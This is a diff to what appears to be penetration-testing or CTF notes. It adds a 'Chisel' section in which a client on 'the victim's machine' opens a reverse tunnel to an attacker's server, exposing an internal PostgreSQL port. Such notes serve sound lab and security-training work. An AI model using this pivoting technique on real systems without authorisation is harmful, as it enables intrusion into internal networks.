@@ -20,3 +20,19 @@ Copy file from remote directory to local computer
 ```bash
 scp remote_username@10.10.0.2:/remote/file.txt /local/directory
 ```
+
+### Chisel
+
+Example for postgresql (port 5432). First we need to transfer chisel.
+
+On the attacker's machine:
+
+```
+chisel server --port 9002 --reverse
+```
+
+On the victim's machine:
+
+```
+./chisel client -v 10.10.16.81:9002 R:5432:172.22.0.1:5432
+```
